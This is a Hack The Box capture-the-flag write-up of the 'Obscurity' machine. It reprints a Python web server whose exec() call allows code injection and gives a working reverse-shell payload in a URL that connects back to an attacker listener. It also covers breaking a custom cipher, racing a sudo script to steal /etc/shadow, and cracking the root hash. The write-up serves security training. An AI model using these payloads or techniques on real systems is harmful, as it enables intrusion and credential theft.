---
layout: single
title: "Obscurity write-up"
date: 2020-05-17 00:22:00 -0000
classes: wide
header:
  teaser: /asset/htbwriteup/linux/obscurity/intro.PNG
  teaser_home_page: true
  icon: /assets/hackthebox.webp
categories: hackthebox
permalink: /htb/htbObscurity
tags: [python, source code, encryption, decryption]

---

# HTB - Obscurity

![alt text](https://raw.githubusercontent.com/faisalfs10x/faisalfs10x.github.io/master/asset/htbwriteup/linux/obscurity/intro.PNG "obscurity intro")
## Recon
    nmap -sV 10.10.10.168 
    
![alt text](https://raw.githubusercontent.com/faisalfs10x/faisalfs10x.github.io/master/asset/htbwriteup/linux/obscurity/1.png)

- From the nmap scan, there are 2 services, OpenSSH 7.6p1 and http-proxy BadHTTPServer.

- As usual, we started to browse to port 8080 which we got a hint to the source code of the application, “SuperSecureServer.py” at the bottom of the page. Then, we added 10.10.10.168 obscure.htb to our `/etc/hosts` file.

![alt text](https://raw.githubusercontent.com/faisalfs10x/faisalfs10x.github.io/master/asset/htbwriteup/linux/obscurity/2.png)

- The hint said that the source code was in the secret development directory. Without any doubt, we fired up wfuzz to fuzzing for the python source code and we got the `develop` directory.

> wfuzz --hc 400,404 -c -w /usr/share/dirb/wordlists/small.txt
> http://10.10.10.168:8080/FUZZ/SuperSecureServer.py

![alt text](https://raw.githubusercontent.com/faisalfs10x/faisalfs10x.github.io/master/asset/htbwriteup/linux/obscurity/4.png)

- Below is the some part of the source code. Let's check the code.

Here:

    import socket
    import threading
    from datetime import datetime
    import sys
    import os
    import mimetypes
    import urllib.parse
    import subprocess

    respTemplate = """HTTP/1.1 {statusNum} {statusCode}
    Date: {dateSent}
    Server: {server}
    Last-Modified: {modified}
    Content-Length: {length}
    Content-Type: {contentType}
    Connection: {connectionType}
    
    {body}
    """
    DOC_ROOT = "DocRoot"

    CODES = {"200": "OK", 
            "304": "NOT MODIFIED",
            "400": "BAD REQUEST", "401": "UNAUTHORIZED", "403": "FORBIDDEN", "404": "NOT FOUND", 
            "500": "INTERNAL SERVER ERROR"}

    MIMES = {"txt": "text/plain", "css":"text/css", "html":"text/html", "png": "image/png", "jpg":"image/jpg", 
            "ttf":"application/octet-stream","otf":"application/octet-stream", "woff":"font/woff", "woff2": "font/woff2", 
            "js":"application/javascript","gz":"application/zip", "py":"text/plain", "map": "application/octet-stream"}

    class Response:
        def __init__(self, **kwargs):
            self.__dict__.update(kwargs)
            now = datetime.now()
            self.dateSent = self.modified = now.strftime("%a, %d %b %Y %H:%M:%S")
        def stringResponse(self):
            return respTemplate.format(**self.__dict__)

    class Request:
        def __init__(self, request):
            self.good = True
            try:
                request = self.parseRequest(request)
                self.method = request["method"]
                self.doc = request["doc"]
                self.vers = request["vers"]
                self.header = request["header"]
                self.body = request["body"]
            except:
                self.good = False

    def parseRequest(self, request):        
        req = request.strip("\r").split("\n")
        method,doc,vers = req[0].split(" ")
        header = req[1:-3]
        body = req[-1]
        headerDict = {}
        for param in header:
            pos = param.find(": ")
            key, val = param[:pos], param[pos+2:]
            headerDict.update({key: val})
        return {"method": method, "doc": doc, "vers": vers, "header": headerDict, "body": body}


    class Server:
        def __init__(self, host, port):    
            self.host = host
            self.port = port
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.sock.bind((self.host, self.port))

    def listen(self):
        self.sock.listen(5)
        while True:
            client, address = self.sock.accept()
            client.settimeout(60)
            threading.Thread(target = self.listenToClient,args = (client,address)).start()

    def listenToClient(self, client, address):
        size = 1024
        while True:
            try:
                data = client.recv(size)
                if data:
                    # Set the response to echo back the recieved data 
                    req = Request(data.decode())
                    self.handleRequest(req, client, address)
                    client.shutdown()
                    client.close()
                else:
                    raise error('Client disconnected')
            except:
                client.close()
                return False
    
    def handleRequest(self, request, conn, address):
        if request.good:
        #            try:
                    # print(str(request.method) + " " + str(request.doc), end=' ')
                    # print("from {0}".format(address[0]))
    #            except Exception as e:
    #                print(e)
            document = self.serveDoc(request.doc, DOC_ROOT)
            statusNum=document["status"]
        else:
            document = self.serveDoc("/errors/400.html", DOC_ROOT)
            statusNum="400"
        body = document["body"]
        
        statusCode=CODES[statusNum]
        dateSent = ""
        server = "BadHTTPServer"
        modified = ""
        length = len(body)
        contentType = document["mime"] # Try and identify MIME type from string
        connectionType = "Closed"


        resp = Response(
        statusNum=statusNum, statusCode=statusCode, 
        dateSent = dateSent, server = server, 
        modified = modified, length = length, 
        contentType = contentType, connectionType = connectionType, 
        body = body
        )

        data = resp.stringResponse()
        if not data:
            return -1
        conn.send(data.encode())
        return 0

    def serveDoc(self, path, docRoot):
        path = urllib.parse.unquote(path)
        try:
            info = "output = 'Document: {}'" # Keep the output for later debug
            exec(info.format(path)) # This is how you do string formatting, right?
            cwd = os.path.dirname(os.path.realpath(__file__))
            docRoot = os.path.join(cwd, docRoot)
            if path == "/":
                path = "/index.html"
            requested = os.path.join(docRoot, path[1:])
            if os.path.isfile(requested):
                mime = mimetypes.guess_type(requested)
                mime = (mime if mime[0] != None else "text/html")
                mime = MIMES[requested.split(".")[-1]]
                try:
                    with open(requested, "r") as f:
                        data = f.read()
                except:
                    with open(requested, "rb") as f:
                        data = f.read()
                status = "200"
            else:
                errorPage = os.path.join(docRoot, "errors", "404.html")
                mime = "text/html"
                with open(errorPage, "r") as f:
                    data = f.read().format(path)
                status = "404"
        except Exception as e:
            print(e)
            errorPage = os.path.join(docRoot, "errors", "500.html")
            mime = "text/html"
            with open(errorPage, "r") as f:
                data = f.read()
            status = "500"
        return {"body": data, "mime": mime, "status": status}

 - After reviewing the source code we found that it is vulnerable to RCE at line 142 by exec function in serveDoc. The exec() may be dangerous if run outside it function. The idea is to run python reverse shell in the URL to obtain a shell.

![alt text](https://raw.githubusercontent.com/faisalfs10x/faisalfs10x.github.io/master/asset/htbwriteup/linux/obscurity/6_vulnerablecode.png)

## Exploit
- So, we insert the [python reverse shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python) from PayloadsAllTheThings github to the URL and get the nc to listen to our payload.

`http://10.10.10.168:8080/';s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.115",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'`

![alt text](https://raw.githubusercontent.com/faisalfs10x/faisalfs10x.github.io/master/asset/htbwriteup/linux/obscurity/7.png)

- Here we got `www-data` shell.

![alt text](https://raw.githubusercontent.com/faisalfs10x/faisalfs10x.github.io/master/asset/htbwriteup/linux/obscurity/8.png)

### www-data to robert shell:
- We list all the files on robert directory.

![alt text](https://raw.githubusercontent.com/faisalfs10x/faisalfs10x.github.io/master/asset/htbwriteup/linux/obscurity/9.png)

- `check.txt` file content that says: “_Encrypting this file with your key should result in out.txt, make sure your key is correct!_”.
- `SuperSecureCrypt.py` source code is used for encryption and decryption.
 
![alt text](https://raw.githubusercontent.com/faisalfs10x/faisalfs10x.github.io/master/asset/htbwriteup/linux/obscurity/10.png)

- we will decrypt `out.txt` using `check.txt` content as a key and get the result in a file called `dbkey.txt`.
- `python3 SuperSecureCrypt.py -i out.txt -o /tmp/dbkey.txt -d -k “Encrypting this file with your key should result in out.txt, make sure your key is correct!”`

![alt text](https://raw.githubusercontent.com/faisalfs10x/faisalfs10x.github.io/master/asset/htbwriteup/linux/obscurity/11.png)

- Yeay, we got the key as `alexandrovich` and we can decrypt `passwordreminder.txt`.
- `python3 SuperSecureCrypt.py -i passwordreminder.txt -o /tmp/d22key.txt -d -k “alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovich”` 
- Then, we got **_SecThruObsFTW_** as robert password.

![alt text](https://raw.githubusercontent.com/faisalfs10x/faisalfs10x.github.io/master/asset/htbwriteup/linux/obscurity/12.png)

- SSH into robert and got the `user.txt` flag.

![alt text](https://raw.githubusercontent.com/faisalfs10x/faisalfs10x.github.io/master/asset/htbwriteup/linux/obscurity/13user.png)

## Privilege escalation

- To escalate we tried basic enum using `sudo -l` and found that `robert` can run `BetterSSH.py` without any password as `root`.

### getting shadow file for cracking process:
Here is the snip of main content in `BetterSSH.py`:
	
	session['user'] = input("Enter username: ")
    passW = input("Enter password: ")

    with open('/etc/shadow', 'r') as f:
        data = f.readlines()
    data = [(p.split(":") if "$" in p else None) for p in data]
    passwords = []
    for x in data:
        if not x == None:
            passwords.append(x)

    passwordFile = '\n'.join(['\n'.join(p) for p in passwords]) 
    with open('/tmp/SSH/'+path, 'w') as f:
        f.write(passwordFile)
    time.sleep(.1)
    salt = ""
    realPass = ""
    for p in passwords:
        if p[0] == session['user']:
            salt, realPass = p[1].split('$')[2:]
            break

- When authenticated, reading the /etc/ shadow file, the script temporarily stores the shadow file in the /tmp/SSH / directory.            
- We tried to input the right credential and it will produce root shadow in the `/tmp/SSH/` directory but it will lost after 0.1 second.

![alt text](https://raw.githubusercontent.com/faisalfs10x/faisalfs10x.github.io/master/asset/htbwriteup/linux/obscurity/14.png)

- So, we used watch in linux. Watch is a command-line tool, part of the Linux procps and procps-ng packages, that runs the specified command repeatedly and displays the results on standard output so you can watch it change over time.

![alt text](https://raw.githubusercontent.com/faisalfs10x/faisalfs10x.github.io/master/asset/htbwriteup/linux/obscurity/15.png)

- Here, we got the root hash, view the roothash file.

![alt text](https://raw.githubusercontent.com/faisalfs10x/faisalfs10x.github.io/master/asset/htbwriteup/linux/obscurity/16.png)

- The shadow file is split and we need to combine into right format before cracking them.

![alt text](https://raw.githubusercontent.com/faisalfs10x/faisalfs10x.github.io/master/asset/htbwriteup/linux/obscurity/17.png)

- Unshadow using combination of `passwd` file and the root hash we obtained earlier and output to `hash.txt` file.

![alt text](https://raw.githubusercontent.com/faisalfs10x/faisalfs10x.github.io/master/asset/htbwriteup/linux/obscurity/18.png)

- Using john to crack the hash and got `mercedes` as the root password.

![alt text](https://raw.githubusercontent.com/faisalfs10x/faisalfs10x.github.io/master/asset/htbwriteup/linux/obscurity/19.png)

- Finally, `su` into root and voilaa!!

![alt text](https://raw.githubusercontent.com/faisalfs10x/faisalfs10x.github.io/master/asset/htbwriteup/linux/obscurity/20root.png)

Thanks.
